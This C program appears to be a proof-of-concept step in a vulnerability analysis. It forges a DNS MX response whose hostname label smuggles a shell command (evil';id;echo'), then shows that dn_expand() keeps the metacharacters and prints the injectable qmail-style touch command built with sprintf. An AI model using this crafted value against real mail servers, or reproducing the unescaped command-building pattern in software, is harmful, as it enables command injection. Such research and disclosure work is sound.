/*
 * Link 1 validation: Prove that dn_expand() preserves shell metacharacters
 * from DNS wire format MX exchange hostnames.
 * 
 * We construct a fake DNS response with an MX record whose exchange hostname
 * contains shell metacharacters (single quote, semicolons, backticks, $())
 * and show that dn_expand() outputs them unchanged.
 */
#include <stdio.h>
#include <string.h>
#include <arpa/nameser.h>
#include <resolv.h>

int main() {
    /*
     * Construct a minimal DNS response with an MX record.
     * The MX exchange hostname is: evil';id;echo'.example.com
     * In DNS wire format, this is encoded as:
     *   \x12 evil';id;echo'    (label length 18, then 18 bytes)
     *   \x07 example            (label length 7, then 7 bytes)
     *   \x03 com                (label length 3, then 3 bytes)
     *   \x00                    (root label)
     */
    
    /* DNS header (12 bytes): 1 question, 1 answer */
    unsigned char response[512];
    memset(response, 0, sizeof(response));
    
    /* Transaction ID */
    response[0] = 0x00; response[1] = 0x01;
    /* Flags: QR=1, AA=1, standard response */
    response[2] = 0x84; response[3] = 0x00;
    /* QDCOUNT = 1 */
    response[4] = 0x00; response[5] = 0x01;
    /* ANCOUNT = 1 */
    response[6] = 0x00; response[7] = 0x01;
    /* NSCOUNT = 0, ARCOUNT = 0 */
    response[8] = 0x00; response[9] = 0x00;
    response[10] = 0x00; response[11] = 0x00;
    
    int pos = 12;
    
    /* Question section: example.com MX IN */
    response[pos++] = 7; /* label length */
    memcpy(response + pos, "example", 7); pos += 7;
    response[pos++] = 3;
    memcpy(response + pos, "com", 3); pos += 3;
    response[pos++] = 0; /* root */
    /* QTYPE = MX (15) */
    response[pos++] = 0x00; response[pos++] = 0x0f;
    /* QCLASS = IN (1) */
    response[pos++] = 0x00; response[pos++] = 0x01;
    
    /* Answer section: MX record */
    /* Name: pointer to offset 12 (the question name) */
    response[pos++] = 0xc0; response[pos++] = 0x0c;
    /* TYPE = MX (15) */
    response[pos++] = 0x00; response[pos++] = 0x0f;
    /* CLASS = IN (1) */
    response[pos++] = 0x00; response[pos++] = 0x01;
    /* TTL = 3600 */
    response[pos++] = 0x00; response[pos++] = 0x00;
    response[pos++] = 0x0e; response[pos++] = 0x10;
    
    /* RDLENGTH - we'll fill in later */
    int rdlen_pos = pos;
    pos += 2;
    
    int rdata_start = pos;
    
    /* MX preference = 10 */
    response[pos++] = 0x00; response[pos++] = 0x0a;
    
    /* MX exchange: evil';id;echo'.example.com */
    /* Label 1: evil';id;echo' (18 bytes with shell metacharacters) */
    const char *label1 = "evil';id;echo'";
    int label1_len = strlen(label1);
    response[pos++] = (unsigned char)label1_len;
    memcpy(response + pos, label1, label1_len); pos += label1_len;
    
    /* Label 2: example (7 bytes) */
    response[pos++] = 7;
    memcpy(response + pos, "example", 7); pos += 7;
    
    /* Label 3: com (3 bytes) */
    response[pos++] = 3;
    memcpy(response + pos, "com", 3); pos += 3;
    
    /* Root label */
    response[pos++] = 0;
    
    /* Fill in RDLENGTH */
    int rdlen = pos - rdata_start;
    response[rdlen_pos] = (rdlen >> 8) & 0xff;
    response[rdlen_pos + 1] = rdlen & 0xff;
    
    int responselen = pos;
    
    /* Now call dn_expand on the MX exchange field */
    char name[MAXDNAME];
    unsigned char *responseend = response + responselen;
    
    /* Skip to answer section, skip name (pointer = 2 bytes), skip type/class/ttl/rdlen (10 bytes), skip MX pref (2 bytes) */
    /* Question section ends at position we calculated */
    int question_end = 12 + 1 + 7 + 1 + 3 + 1 + 4; /* header + labels + type + class */
    unsigned char *answer_start = response + question_end;
    unsigned char *mx_exchange = answer_start + 2 + 10 + 2; /* name_ptr + fixed_fields + mx_pref */
    
    int result = dn_expand(response, responseend, mx_exchange, name, MAXDNAME);
    
    if (result < 0) {
        printf("FAIL: dn_expand returned %d\n", result);
        return 1;
    }
    
    printf("SUCCESS: dn_expand output: [%s]\n", name);
    printf("Contains single quote: %s\n", strchr(name, '\'') ? "YES" : "NO");
    printf("Contains semicolon: %s\n", strchr(name, ';') ? "YES" : "NO");
    
    /* Now show what the sprintf + popen would produce */
    char acfcommand[1200];
    const char *pw_dir = "/var/qmail";
    sprintf(acfcommand, "/bin/touch %s/control/notlshosts/'%s'", pw_dir, name);
    printf("\nResulting shell command:\n%s\n", acfcommand);
    
    printf("\nShell would interpret this as multiple commands due to unescaped quotes.\n");
    
    return 0;
}
